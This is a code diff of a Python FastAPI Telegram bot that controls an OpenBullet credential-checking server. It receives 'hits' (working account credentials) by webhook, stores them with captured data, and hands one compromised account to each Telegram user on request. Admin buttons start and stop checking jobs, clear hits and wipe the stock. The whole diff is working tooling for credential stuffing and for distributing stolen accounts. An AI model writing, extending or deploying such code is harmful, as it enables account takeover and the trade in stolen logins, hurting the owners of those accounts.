@@ -3,6 +3,7 @@ import httpx
 import os
 import logging
 import hashlib
+from datetime import datetime
 from sqlalchemy import create_engine, Column, Integer, String, Boolean, func
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import sessionmaker
@@ -19,10 +20,8 @@ app = FastAPI()
 # ==================== CONFIGURATION ====================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 ADMIN_IDS = os.getenv("ADMIN_IDS", "6624995237").split(",")
-
 OPENBULLET_URL = os.getenv("OPENBULLET_URL")
 OPENBULLET_API_KEY = os.getenv("OPENBULLET_API_KEY")
-
 DATABASE_URL = os.getenv("DATABASE_URL")
 if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
     DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
@@ -63,14 +62,31 @@ def safe_md(text: str) -> str:
     return str(text).replace("`", "'").replace("\\", "/")
 
 
-def resolve_progress(val) -> str:
+def make_bar(percent: float, length: int = 10) -> str:
     try:
-        p = float(val) if val is not None else 0.0
+        p = max(0.0, min(100.0, float(percent)))
     except (TypeError, ValueError):
-        return "0.0"
-    if p <= 1.0:
-        return f"{p * 100:.1f}"
-    return f"{p:.1f}"
+        p = 0.0
+    filled = int(p / 100 * length)
+    return "█" * filled + "░" * (length - filled)
+
+
+def format_uptime(start_str: str) -> str:
+    try:
+        start = datetime.fromisoformat(start_str.replace("Z", "+00:00"))
+        delta = datetime.utcnow() - start.replace(tzinfo=None)
+        total_sec = int(delta.total_seconds())
+        d, rem = divmod(total_sec, 86400)
+        h, rem = divmod(rem, 3600)
+        m, s = divmod(rem, 60)
+        parts = []
+        if d > 0: parts.append(f"{d}d")
+        if h > 0: parts.append(f"{h}h")
+        if m > 0: parts.append(f"{m}m")
+        if not parts: parts.append(f"{s}s")
+        return " ".join(parts)
+    except Exception:
+        return "N/A"
 
 
 # ==================== KEYBOARDS ====================
@@ -78,134 +94,137 @@ def resolve_progress(val) -> str:
 
 def get_main_keyboard(is_admin: bool):
     buttons = [
-        [
-            {"text": "⚡ 🧬 سحب حساب جديد 🧬 ⚡"},
-            {"text": "📡 🌐 إحصائيات المخزن 🌐 📡"},
-        ],
-        [{"text": "🤖 ⚔️ عمليات أوبن بلوت الجارية ⚔️ 🤖"}],
+        [{"text": "⚡ ⚡ سحب حساب جديد"}, {"text": "📡 إحصائيات المخزون"}],
+        [{"text": "🤖 شاشة مراقبة أوبن بلوت"}],
+        [{"text": "🖥️ معلومات الخادم"}],
     ]
     if is_admin:
-        buttons.append([{"text": "🛠️ 👾 لوحة تحكم المطور 👾 🛠️"}])
-    return {
-        "keyboard": buttons,
-        "resize_keyboard": True,
-        "one_time_keyboard": False,
-    }
+        buttons.append([{"text": "🛠️ لوحة تحكم المطور"}])
+    return {"keyboard": buttons, "resize_keyboard": True, "one_time_keyboard": False}
 
 
-def get_inline_control_buttons():
+def get_admin_inline():
     return {
         "inline_keyboard": [
             [
-                {"text": "🧹 تصفير الموزع", "callback_data": "reset_delivered"},
-                {"text": "🚨 تصفير المخزن بالكامل", "callback_data": "clear_accounts"},
+                {"text": "🧹 تصفير الموزع", "callback_data": "act:reset_delivered"},
+                {"text": "🗑️ مسح المخزن", "callback_data": "act:clear_accounts"},
             ],
-            [
-                {"text": "🔄 تحديث بيانات اللوحة", "callback_data": "refresh_admin_stats"}
-            ],
+            [{"text": "💥 مسح Hits من OB", "callback_data": "act:clear_ob_hits"}],
+            [{"text": "🔄 تحديث", "callback_data": "act:refresh_admin"}],
         ]
     }
 
 
-# ==================== TELEGRAM SENDER WRAPPERS ====================
+def get_job_inline(jobs: list) -> dict:
+    buttons = []
+    row = []
+    for j in jobs:
+        jid = j.get("id")
+        name = (j.get("name") or "Job")[:12]
+        status = str(j.get("status", "")).lower()
+        if status == "running":
+            row.append({"text": f"⏹ {name}#{jid}", "callback_data": f"ctrl:stop:{jid}"})
+        elif status in ("idle", "completed", "stopped"):
+            row.append({"text": f"▶ {name}#{jid}", "callback_data": f"ctrl:start:{jid}"})
+        if len(row) == 2:
+            buttons.append(row)
+            row = []
+    if row:
+        buttons.append(row)
+    buttons.append([{"text": "🔄 تحديث الشاشة", "callback_data": "ctrl:refresh"}])
+    return {"inline_keyboard": buttons}
 
 
-async def tg_send(chat_id: str, text: str, **kwargs):
+# ==================== TELEGRAM SENDERS ====================
+
+
+async def tg_send(chat_id: str, text: str, **kw):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
-    payload.update(kwargs)
+    p = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+    p.update(kw)
     async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
         try:
-            await c.post(url, json=payload)
+            await c.post(url, json=p)
         except Exception as e:
-            logger.error(f"tg_send failed: {e}")
+            logger.error(f"tg_send: {e}")
 
 
-async def tg_edit(chat_id: str, message_id: int, text: str, **kwargs):
+async def tg_edit(chat_id: str, mid: int, text: str, **kw):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
-    payload = {
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": "Markdown",
-    }
-    payload.update(kwargs)
+    p = {"chat_id": chat_id, "message_id": mid, "text": text, "parse_mode": "Markdown"}
+    p.update(kw)
     async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
         try:
-            await c.post(url, json=payload)
+            await c.post(url, json=p)
         except Exception as e:
-            logger.error(f"tg_edit failed: {e}")
+            logger.error(f"tg_edit: {e}")
 
 
-async def tg_answer(callback_id: str, text: str, show_alert: bool = False):
+async def tg_answer(cid: str, text: str, alert: bool = False):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
     async with httpx.AsyncClient(verify=False, timeout=10.0) as c:
         try:
-            await c.post(
-                url,
-                json={
-                    "callback_query_id": callback_id,
-                    "text": text,
-                    "show_alert": show_alert,
-                },
-            )
+            await c.post(url, json={"callback_query_id": cid, "text": text, "show_alert": alert})
         except Exception as e:
-            logger.error(f"tg_answer failed: {e}")
+            logger.error(f"tg_answer: {e}")
 
 
-# ==================== OPENBULLET API ====================
+# ==================== OPENBULLET API (سريع وآمن) ====================
 
 
-async def get_auth_headers() -> tuple:
-    """
-    يجرب 3 صيغ مصادقة ويرجع (headers_dict, label_string).
-    يُرجع (None, None) إذا فشلت كلها.
-    مُغلف بـ try/except لمنع الانهيار.
-    """
+async def _auth() -> tuple:
     if not OPENBULLET_URL or not OPENBULLET_API_KEY:
         return None, None
-
     base = OPENBULLET_URL.strip().rstrip("/")
-    raw_key = OPENBULLET_API_KEY.strip()
-    test_url = f"{base}/api/v1/job/all"
-
+    key = OPENBULLET_API_KEY.strip()
     methods = [
-        ({"Authorization": raw_key, "Accept": "application/json"}, "مباشر"),
-        ({"Authorization": f"Bearer {raw_key}", "Accept": "application/json"}, "Bearer"),
-        ({"X-API-Key": raw_key, "Accept": "application/json"}, "X-API-Key"),
+        ({"Authorization": key, "Accept": "application/json"}, "Direct"),
+        ({"Authorization": f"Bearer {key}", "Accept": "application/json"}, "Bearer"),
+        ({"X-API-Key": key, "Accept": "application/json"}, "X-API-Key"),
     ]
-
     try:
-        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
-            for hdrs, label in methods:
+        async with httpx.AsyncClient(verify=False, timeout=8.0) as c:
+            for h, l in methods:
                 try:
-                    resp = await client.get(test_url, headers=hdrs)
-                    if resp.status_code == 200 and "json" in resp.headers.get("content-type", ""):
-                        logger.info(f"Auth '{label}' succeeded")
-                        return hdrs, label
-                    else:
-                        logger.warning(f"Auth '{label}' -> HTTP {resp.status_code}")
-                except Exception as e:
-                    logger.error(f"Auth '{label}' connection error: {e}")
+                    r = await c.get(f"{base}/api/v1/job/all", headers=h)
+                    if r.status_code == 200 and "json" in r.headers.get("content-type", ""):
+                        return h, l
+                except Exception:
+                    pass
     except Exception as e:
-        logger.error(f"get_auth_headers fatal error: {e}")
-
+        logger.error(f"Auth: {e}")
     return None, None
 
 
-def _unwrap(obj) -> dict:
-    """يفك غلاف 'value' إن وُجد."""
-    if not isinstance(obj, dict):
-        return obj
-    if "value" in obj and isinstance(obj["value"], dict):
-        merged = {k: v for k, v in obj.items() if k != "value"}
-        merged.update(obj["value"])
-        return merged
-    return obj
+async def _ob(path: str, headers: dict, method: str = "GET", body=None, timeout: float = 8.0) -> dict:
+    base = OPENBULLET_URL.strip().rstrip("/")
+    try:
+        async with httpx.AsyncClient(verify=False, timeout=timeout) as c:
+            if method == "GET":
+                r = await c.get(f"{base}{path}", headers=headers)
+            elif method == "POST":
+                r = await c.post(f"{base}{path}", headers=headers, json=body) if body else await c.post(f"{base}{path}", headers=headers)
+            elif method == "DELETE":
+                r = await c.delete(f"{base}{path}", headers=headers)
+            else:
+                return {"ok": False, "error": "Unknown method"}
+
+            if r.status_code in (200, 204):
+                try:
+                    return {"ok": True, "data": r.json()}
+                except Exception:
+                    return {"ok": True, "data": None}
+            return {"ok": False, "error": f"HTTP {r.status_code}"}
+    except Exception as e:
+        return {"ok": False, "error": str(e)}
+
+
+def _is_active(s) -> bool:
+    return str(s).strip().lower() in ("running", "active", "started")
 
 
 def _g(obj, *keys):
-    """يبحث عن أول مفتاح موجود في القاموس."""
     if not isinstance(obj, dict):
         return None
     for k in keys:
@@ -214,244 +233,148 @@ def _g(obj, *keys):
     return None
 
 
-def _num(val, fallback=0) -> int:
-    try:
-        return int(float(val)) if val is not None else fallback
-    except (TypeError, ValueError):
-        return fallback
+# ==================== DATA FETCHERS (خفيفة وسريعة) ====================
 
 
-def _is_active(status_val) -> bool:
-    if status_val is None:
-        return False
-    return str(status_val).strip().lower() in ("running", "active", "started", "executing")
+async def fetch_jobs(headers: dict) -> list:
+    """يجلب قائمة العمليات فقط (الأساسية)."""
+    r = await _ob("/api/v1/job/all", headers)
+    if not r["ok"] or not r["data"]:
+        return []
+    d = r["data"]
+    items = d.get("items", d) if isinstance(d, dict) else d
+    if not isinstance(items, list):
+        return []
+    return [
+        {"id": x["id"], "name": x.get("name", "?"), "status": x.get("status", "?")}
+        for x in items if isinstance(x, dict) and x.get("id") is not None
+    ]
 
 
-def _extract_detail(raw: dict) -> dict:
-    """
-    يستخرج البيانات من رد /api/v1/job/{id}
-    بمرونة تامة لأي اسم حقول.
-    """
-    uw = _unwrap(raw) if isinstance(raw, dict) else {}
-    return {
-        "progress": _g(uw, "progress", "completionRatio", "completionRate", "percent", "completion"),
-        "cpm":      _g(uw, "cpm", "speed", "checkSpeed", "checksPerMinute"),
-        "hits":     _g(uw, "hits", "hitsCount", "good", "goodCount", "success"),
-        "custom":   _g(uw, "custom", "customCount", "captured"),
-        "total":    _g(uw, "total", "totalChecks", "checked", "dataTested"),
-        "bad":      _g(uw, "bad", "badCount", "fail", "failed", "toCheck"),
-        "name":     _g(uw, "name", "jobName", "configName"),
-        "status":   _g(uw, "status", "state"),
-        "_keys":    list(uw.keys()) if isinstance(uw, dict) else [],
-    }
+async def fetch_hits(headers: dict) -> list:
+    """يجلب آخر Hits."""
+    r = await _ob("/api/v1/hit/recent", headers)
+    if not r["ok"] or not r["data"]:
+        return []
+    d = r["data"]
+    items = d.get("items", d) if isinstance(d, dict) else d
+    return items[:4] if isinstance(items, list) else []
 
 
-async def fetch_ob_status() -> dict:
-    """
-    الاستراتيجية:
-      1. مصادقة تلقائية
-      2. /job/all → قائمة العمليات
-      3. فلتر النشطة
-      4. /job/{id} → تفاصيل كل عملية نشطة
-    """
-    headers, auth_label = await get_auth_headers()
-
-    if not headers:
-        return {
-            "error": (
-                "فشلت المصادقة.\n\n"
-                f"🔗 `{OPENBULLET_URL}`\n"
-                f"🔑 `{(OPENBULLET_API_KEY or '')[:8]}...`\n\n"
-                "OB → Settings → General → Admin API Key → احفظ"
-            ),
-            "jobs": [],
-            "monitors": [],
-            "total_all": 0,
-            "auth_method": None,
-        }
-
-    base = OPENBULLET_URL.strip().rstrip("/")
-    result = {
-        "auth_method": auth_label,
-        "jobs": [],
-        "monitors": [],
-        "total_all": 0,
-    }
-
-    try:
-        async with httpx.AsyncClient(verify=False, timeout=15.0) as client:
-
-            # ---- قائمة العمليات ----
-            resp = await client.get(f"{base}/api/v1/job/all", headers=headers)
-            if resp.status_code != 200:
-                return {**result, "error": f"قائمة العمليات: HTTP {resp.status_code}"}
-
-            list_data = resp.json()
-            all_jobs = (
-                list_data.get("items", [])
-                if isinstance(list_data, dict)
-                else (list_data if isinstance(list_data, list) else [])
-            )
-            result["total_all"] = len(all_jobs)
-
-            # ---- فلتر النشطة ----
-            active_items = [
-                {"id": j["id"], "name": j.get("name", "بدون اسم"), "status": j.get("status")}
-                for j in all_jobs
-                if isinstance(j, dict) and j.get("id") is not None and _is_active(j.get("status"))
-            ]
-
-            # ---- جلب تفاصيل كل عملية نشطة ----
-            for item in active_items:
-                detail = {
-                    "id": item["id"],
-                    "name": item["name"],
-                    "status": item["status"],
-                    "progress": None, "cpm": None, "hits": None,
-                    "custom": None, "total": None, "bad": None,
-                }
-                try:
-                    resp2 = await client.get(f"{base}/api/v1/job/{item['id']}", headers=headers)
-                    if resp2.status_code == 200:
-                        raw = resp2.json()
-                        ext = _extract_detail(raw)
-                        detail["progress"] = ext["progress"]
-                        detail["cpm"] = ext["cpm"]
-                        detail["hits"] = ext["hits"]
-                        detail["custom"] = ext["custom"]
-                        detail["total"] = ext["total"]
-                        detail["bad"] = ext["bad"]
-                        if ext["name"]:
-                            detail["name"] = ext["name"]
-                        logger.info(f"Job {item['id']} keys: {ext['_keys']}")
-                    else:
-                        logger.warning(f"Job {item['id']} detail HTTP {resp2.status_code}")
-                except Exception as e:
-                    logger.error(f"Job {item['id']} detail error: {e}")
-
-                result["jobs"].append(detail)
-
-            # ---- مراقبات ----
-            try:
-                resp3 = await client.get(f"{base}/api/v1/jobmonitor/all", headers=headers)
-                if resp3.status_code == 200:
-                    mon_data = resp3.json()
-                    monitors = (
-                        mon_data.get("items", [])
-                        if isinstance(mon_data, dict)
-                        else (mon_data if isinstance(mon_data, list) else [])
-                    )
-                    for m in monitors:
-                        if isinstance(m, dict) and _is_active(m.get("status")):
-                            ext = _extract_detail(m)
-                            result["monitors"].append({
-                                "name": ext["name"] or "مراقب",
-                                "status": ext["status"],
-                                "progress": ext["progress"],
-                                "cpm": ext["cpm"],
-                                "hits": ext["hits"],
-                                "custom": ext["custom"],
-                                "total": ext["total"],
-                                "bad": ext["bad"],
-                            })
-            except Exception as e:
-                logger.error(f"Monitors error: {e}")
-
-    except Exception as e:
-        logger.error(f"fetch_ob_status error: {e}", exc_info=True)
-        return {**result, "error": f"خطأ عام: {e}"}
-
+async def fetch_metrics(headers: dict) -> dict:
+    """يجلب Metrics و Info."""
+    result = {}
+    m = await _ob("/api/v1/info/metrics", headers, timeout=5.0)
+    if m["ok"] and m["data"]:
+        result["metrics"] = m["data"]
+    i = await _ob("/api/v1/info", headers, timeout=5.0)
+    if i["ok"] and i["data"]:
+        result["info"] = i["data"]
     return result
 
 
-def format_ob_message(ob_data: dict) -> str:
-    """يحوّل البيانات لرسالة تلغرام."""
+# ==================== FORMATTERS ====================
 
-    if "error" in ob_data and not ob_data.get("jobs"):
-        return f"❌ **خطأ:**\n{ob_data['error']}"
 
-    auth_line = f"🔑 **المصادقة:** `{ob_data['auth_method']}`\n" if ob_data.get("auth_method") else ""
+def format_monitor(jobs: list, hits: list, metrics: dict, auth: str) -> str:
+    active = [j for j in jobs if _is_active(j.get("status"))]
+    idle = [j for j in jobs if str(j.get("status", "")).lower() == "idle"]
+    done = [j for j in jobs if str(j.get("status", "")).lower() == "completed"]
 
-    jobs = ob_data.get("jobs", [])
-    monitors = ob_data.get("monitors", [])
-    total_all = ob_data.get("total_all", 0)
-    total_active = len(jobs) + len(monitors)
+    lines = ["⚙️ ═══ **CONTROL CENTER** ═══\n"]
 
-    if total_active == 0:
-        return (
-            "💤 **حالة الـ Mainframe:** `خامل (IDLE)`\n\n"
-            f"{auth_line}"
-            f"📊 **إجمالي العمليات:** `{total_all}`\n"
-            f"🟢 **النشطة:** `0`\n\n"
-            "_لا توجد عمليات نشطة حالياً._"
-        )
+    # Metrics
+    met = metrics.get("metrics") or {}
+    inf = metrics.get("info") or {}
+    cpu = _g(met, "cpuUsage", "cpu", "cpu_percent")
+    ram = _g(met, "ramUsage", "ram", "ram_percent")
 
-    lines = [
-        "⚙️ **「 شاشة مراقبة OPENBULLET 」** ⚙️\n",
-        auth_line,
-        f"⚡ **النشطة:** `{total_active}` من `{total_all}`",
-        "━━━━━━━━━━━━━━━━━━━━",
-    ]
+    lines.append("🖥️ **[ SYSTEM ]**")
+    if cpu is not None:
+        try: lines.append(f"├ 💻 CPU: `{make_bar(float(cpu))}` `{float(cpu):.1f}%`")
+        except: lines.append("├ 💻 CPU: `N/A`")
+    else:
+        lines.append("├ 💻 CPU: `N/A`")
+    if ram is not None:
+        try: lines.append(f"├ 🧠 RAM: `{make_bar(float(ram))}` `{float(ram):.1f}%`")
+        except: lines.append("├ 🧠 RAM: `N/A`")
+    else:
+        lines.append("├ 🧠 RAM: `N/A`")
 
-    # تمييز الأسماء المتكررة
-    name_count = {}
-    for j in jobs:
-        name_count[j["name"]] = name_count.get(j["name"], 0) + 1
-    name_seen = {}
+    up = _g(inf, "startTime", "startTimeUtc", "uptime")
+    if up:
+        lines.append(f"└ ⏱️ Up: `{format_uptime(str(up))}`")
+    if auth:
+        lines.append(f"🔑 `{auth}`")
 
-    for job in jobs:
-        name = safe_md(job["name"])
-        if name_count.get(job["name"], 0) > 1:
-            name_seen[job["name"]] = name_seen.get(job["name"], 0) + 1
-            name = f"{name} #{name_seen[job['name']]}"
+    # Jobs
+    lines.append(f"\n📦 **[ JOBS {len(active)}/{len(jobs)} ]**")
+    if active:
+        for j in active:
+            lines.append(f"├ ▶️ `{safe_md(j['name'])[:25]}` #{j['id']}")
+    if idle:
+        for j in idle:
+            lines.append(f"├ ⏸️ `{safe_md(j['name'])[:25]}` #{j['id']}")
+    if done:
+        for j in done:
+            lines.append(f"└ ✅ `{safe_md(j['name'])[:25]}` #{j['id']}")
 
-        hits = _num(job["hits"])
-        custom = _num(job["custom"])
-        total = _num(job["total"])
-        bad = _num(job["bad"])
-        cpm = _num(job["cpm"])
-        progress = resolve_progress(job["progress"])
+    # Hits
+    lines.append(f"\n🎯 **[ HITS {len(hits)} ]**")
+    if hits:
+        for i, h in enumerate(hits, 1):
+            if isinstance(h, dict):
+                cfg = safe_md(_g(h, "configName", "config") or "")
+                acc = safe_md(str(_g(h, "data", "account") or ""))[:30]
+                if cfg:
+                    lines.append(f"├ {i}. `{cfg}` {acc}...")
+                else:
+                    lines.append(f"├ {i}. {acc}...")
+    else:
+        lines.append("└ _لا يوجد بعد..._")
 
-        lines.append(f"📦 **عملية:** `{name}`")
-        lines.append(f"   🆔 `{job['id']}`")
-        lines.append(f"   📊 التقدم: `{progress}%`")
-
-        if total > 0:
-            lines.append(f"   📋 تم فحص: `{total}`")
-            lines.append(f"   🎯 Hits: `{hits}`")
-            if custom > 0:
-                lines.append(f"   ⭐ Custom: `{custom}`")
-            lines.append(f"   ❌ Fail: `{bad}`")
-        else:
-            lines.append(f"   🎯 Hits: `{hits}`")
-            if custom > 0:
-                lines.append(f"   ⭐ Custom: `{custom}`")
-
-        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
-        lines.append("━━━━━━━━━━━━━━━━━━━━")
-
-    for mon in monitors:
-        name = safe_md(mon.get("name", "مراقب"))
-        hits = _num(mon.get("hits"))
-        custom = _num(mon.get("custom"))
-        total = _num(mon.get("total"))
-        cpm = _num(mon.get("cpm"))
-        progress = resolve_progress(mon.get("progress"))
-
-        lines.append(f"🔄 **مراقب:** `{name}`")
-        lines.append(f"   📊 التقدم: `{progress}%`")
-        if total > 0:
-            lines.append(f"   📋 تم فحص: `{total}`")
-        lines.append(f"   🎯 Hits: `{hits}`")
-        if custom > 0:
-            lines.append(f"   ⭐ Custom: `{custom}`")
-        lines.append(f"   ⚡ السرعة: `{cpm}` CPM")
-        lines.append("━━━━━━━━━━━━━━━━━━━━")
-
+    lines.append("\n══════════════════════════════")
     return "\n".join(lines)
 
 
-# ==================== WEBHOOK: HIT ====================
+def format_server(metrics: dict, auth: str, jobs_count: int) -> str:
+    met = metrics.get("metrics") or {}
+    inf = metrics.get("info") or {}
+
+    lines = ["🖥️ ═══ **SERVER INFO** ═══\n"]
+
+    ver = _g(inf, "version", "obVersion")
+    if ver:
+        lines.append(f"🏷️ **Ver:** `{safe_md(str(ver))}`")
+
+    up = _g(inf, "startTime", "startTimeUtc", "uptime")
+    if up:
+        lines.append(f"⏱️ **Up:** `{format_uptime(str(up))}`")
+
+    os_i = _g(inf, "os", "operatingSystem")
+    if os_i:
+        lines.append(f"💻 **OS:** `{safe_md(str(os_i))}`")
+
+    lines.append(f"\n📊 **[ RESOURCES ]**")
+    cpu = _g(met, "cpuUsage", "cpu", "cpu_percent")
+    ram = _g(met, "ramUsage", "ram", "ram_percent")
+
+    if cpu is not None:
+        try: lines.append(f"├ 💻 CPU: `{make_bar(float(cpu), 12)}` `{float(cpu):.1f}%`")
+        except: pass
+    if ram is not None:
+        try: lines.append(f"├ 🧠 RAM: `{make_bar(float(ram), 12)}` `{float(ram):.1f}%`")
+        except: pass
+
+    lines.append(f"\n📦 **Jobs:** `{jobs_count}`")
+    if auth:
+        lines.append(f"🔑 Auth: `{auth}`")
+
+    lines.append("\n══════════════════════════════")
+    return "\n".join(lines)
+
+
+# ==================== WEBHOOK: HIT FROM OB ====================
 
 
 @app.post("/webhook/hit")
@@ -459,7 +382,6 @@ async def receive_hit(request: Request):
     db = SessionLocal()
     try:
         data = await request.json()
-
         config_name = "UNKNOWN"
         for key in ("config", "configName", "ConfigName"):
             if data.get(key):
@@ -480,18 +402,13 @@ async def receive_hit(request: Request):
         if db.query(Account).filter(Account.account_data == account_data).first():
             return {"status": "ignored"}
 
-        db.add(Account(
-            config_name=config_name or "UNKNOWN",
-            account_data=account_data,
-            captured_data=captured_data,
-            is_given=False,
-        ))
+        db.add(Account(config_name=config_name or "UNKNOWN", account_data=account_data, captured_data=captured_data, is_given=False))
         db.commit()
         return {"status": "success"}
     except Exception as e:
         db.rollback()
-        logger.error(f"/webhook/hit error: {e}", exc_info=True)
-        return {"status": "error", "message": str(e)}
+        logger.error(f"/webhook/hit: {e}", exc_info=True)
+        return {"status": "error"}
     finally:
         db.close()
 
@@ -505,16 +422,17 @@ async def telegram_webhook(request: Request):
     try:
         payload = await request.json()
 
-        # ========== CALLBACK ==========
+        # ==================== CALLBACKS ====================
         if "callback_query" in payload:
             cb = payload["callback_query"]
-            callback_id = cb["id"]
+            cid = cb["id"]
             chat_id = str(cb["message"]["chat"]["id"])
-            message_id = cb["message"]["message_id"]
-            data = cb["data"]
+            mid = cb["message"]["message_id"]
+            cdata = cb["data"]
 
-            if data.startswith("claim_cfg:"):
-                cfg_h = data.split("claim_cfg:", 1)[1]
+            # ---- 1) سحب حساب ----
+            if cdata.startswith("claim_cfg:"):
+                cfg_h = cdata.split("claim_cfg:", 1)[1]
                 all_cfgs = db.query(Account.config_name).filter(Account.is_given == False).distinct().all()
                 selected = None
                 for (name,) in all_cfgs:
@@ -523,71 +441,127 @@ async def telegram_webhook(request: Request):
                         break
 
                 if not selected:
-                    await tg_answer(callback_id, "❌ لم يتم العثور على هذا النوع!", show_alert=True)
+                    await tg_answer(cid, "❌ نوع غير موجود!", alert=True)
                     return {"status": "ok"}
 
                 if db.query(DeliveredAccount).filter(DeliveredAccount.user_id == chat_id).first():
-                    await tg_answer(callback_id, "❌ لقد سحبت حصتك سابقاً!", show_alert=True)
+                    await tg_answer(cid, "❌ سحبت حصتك مسبقاً!", alert=True)
                     return {"status": "ok"}
 
-                account = (
-                    db.query(Account)
-                    .filter(Account.config_name == selected, Account.is_given == False)
-                    .with_for_update().first()
-                )
-
-                if not account:
-                    await tg_answer(callback_id, "😔 نفدت الحسابات من هذا النوع!", show_alert=True)
+                acc = db.query(Account).filter(Account.config_name == selected, Account.is_given == False).with_for_update().first()
+                if not acc:
+                    await tg_answer(cid, "😔 نفدت!", alert=True)
                     return {"status": "ok"}
 
-                account.is_given = True
+                acc.is_given = True
                 db.add(DeliveredAccount(user_id=chat_id))
                 db.commit()
 
-                await tg_edit(chat_id, message_id,
-                    f"🌌 **⚡ 「 تم السحب بنجاح 」 ⚡** 🌌\n\n"
-                    f"📦 **النوع:** `{safe_md(account.config_name)}`\n\n"
-                    f"👤 **الحساب:**\n`{safe_md(account.account_data)}`\n\n"
-                    f"⚙️ **المستخرج:**\n`{safe_md(account.captured_data)}`\n\n"
-                    f"🔒 _STATUS: TERMINAL LOCKED_"
+                await tg_edit(chat_id, mid,
+                    "🌌 **⚡ 「 تم السحب بنجاح 」 ⚡** 🌌\n\n"
+                    f"📦 **النوع:** `{safe_md(acc.config_name)}`\n\n"
+                    f"👤 **الحساب:**\n`{safe_md(acc.account_data)}`\n\n"
+                    f"⚙️ **المستخرج:**\n`{safe_md(acc.captured_data)}`\n\n"
+                    "🔒 _STATUS: TERMINAL LOCKED_"
                 )
                 return {"status": "ok"}
 
-            if chat_id not in ADMIN_IDS:
+            # ---- 2) تحكم بالعمليات ----
+            if cdata.startswith("ctrl:"):
+                parts = cdata.split(":")
+                action = parts[1] if len(parts) > 1 else ""
+
+                # زر تحديث الشاشة
+                if action == "refresh":
+                    await tg_answer(cid, "🔄 جاري التحديث...", alert=False)
+                    headers, auth_label = await _auth()
+                    if not headers:
+                        await tg_edit(chat_id, mid, "❌ **فشلت المصادقة**")
+                        return {"status": "ok"}
+                    jobs = await fetch_jobs(headers)
+                    hits = await fetch_hits(headers)
+                    metrics = await fetch_metrics(headers)
+                    await tg_edit(chat_id, mid, format_monitor(jobs, hits, metrics, auth_label), reply_markup=get_job_inline(jobs))
+                    return {"status": "ok"}
+
+                # إيقاف / تشغيل
+                if action in ("start", "stop") and len(parts) == 3:
+                    try:
+                        job_id = int(parts[2])
+                    except ValueError:
+                        await tg_answer(cid, "❌ معرف خاطئ", alert=True)
+                        return {"status": "ok"}
+
+                    label = "تشغيل" if action == "start" else "إيقاف"
+                    await tg_answer(cid, f"⏳ جاري {label}...", alert=False)
+
+                    headers, _ = await _auth()
+                    if not headers:
+                        await tg_answer(cid, "❌ فشلت المصادقة", alert=True)
+                        return {"status": "ok"}
+
+                    r = await _ob(f"/api/v1/job/{action}", headers, "POST", body=job_id)
+                    if r["ok"]:
+                        # نُجح العملية، نحدّث الشاشة
+                        jobs = await fetch_jobs(headers)
+                        hits = await fetch_hits(headers)
+                        metrics = await fetch_metrics(headers)
+                        await tg_edit(chat_id, mid, format_monitor(jobs, hits, metrics, _), reply_markup=get_job_inline(jobs))
+                    else:
+                        await tg_answer(cid, f"❌ فشل: {r.get('error', '?')}", alert=True)
+                    return {"status": "ok"}
+
+                # fallback
+                await tg_answer(cid, "❌ أمر غير معروف", alert=True)
                 return {"status": "ok"}
 
-            if data == "reset_delivered":
-                count = db.query(DeliveredAccount).count()
+            # ---- 3) أوامر المطور ----
+            if chat_id not in ADMIN_IDS:
+                await tg_answer(cid, "❌ للمطور فقط", alert=True)
+                return {"status": "ok"}
+
+            if cdata == "act:reset_delivered":
+                cnt = db.query(DeliveredAccount).count()
                 db.query(DeliveredAccount).delete()
                 db.commit()
-                await tg_answer(callback_id, f"🧹 تم تصفير الموزع ({count} سجل)", show_alert=True)
+                await tg_answer(cid, f"🧹 تم تصفير الموزع ({cnt})", alert=True)
 
-            elif data == "clear_accounts":
+            elif cdata == "act:clear_accounts":
                 ac = db.query(Account).count()
                 dc = db.query(DeliveredAccount).count()
                 db.query(DeliveredAccount).delete()
                 db.query(Account).delete()
                 db.commit()
-                await tg_answer(callback_id, f"🚨 مسح {ac} حساب و {dc} سجل.", show_alert=True)
+                await tg_answer(cid, f"🚨 مسح {ac} حساب + {dc} سجل", alert=True)
 
-            elif data == "refresh_admin_stats":
+            elif cdata == "act:clear_ob_hits":
+                await tg_answer(cid, "⏳ جاري المسح...", alert=False)
+                headers, _ = await _auth()
+                if headers:
+                    r = await _ob("/api/v1/hit/clear", headers, "DELETE")
+                    if r["ok"]:
+                        await tg_answer(cid, "💥 تم مسح الـ Hits!", alert=True)
+                    else:
+                        await tg_answer(cid, f"❌ فشل: {r.get('error')}", alert=True)
+                else:
+                    await tg_answer(cid, "❌ فشلت المصادقة", alert=True)
+
+            elif cdata == "act:refresh_admin":
                 total = db.query(Account).count()
                 avail = db.query(Account).filter(Account.is_given == False).count()
                 given = db.query(Account).filter(Account.is_given == True).count()
-                await tg_edit(chat_id, message_id,
-                    f"┌─── 🌌 **「 لوحة تحكم النيون 」** 🌌\n"
-                    f"│\n"
-                    f"├── 🟣 **الإجمالي:** `{total}`\n"
-                    f"├── 🟢 **الجاهزة:** `{avail}`\n"
-                    f"└── 🔴 **الموزعة:** `{given}`\n"
-                    f"│\n"
-                    f"└────────────── [ تحديث مباشر ] 🖥️",
-                    reply_markup=get_inline_control_buttons()
+                await tg_edit(chat_id, mid,
+                    "🛠️ ═══ **DEVELOPER PANEL** ═══\n\n"
+                    f"├ 🟣 **الإجمالي:** `{total}`\n"
+                    f"├ 🟢 **الجاهزة:** `{avail}`\n"
+                    f"└ 🔴 **الموزعة:** `{given}`\n\n"
+                    "══════════════════════════════",
+                    reply_markup=get_admin_inline()
                 )
 
             return {"status": "ok"}
 
-        # ========== TEXT ==========
+        # ==================== MESSAGES ====================
         if "message" not in payload or "text" not in payload["message"]:
             return {"status": "ignored"}
 
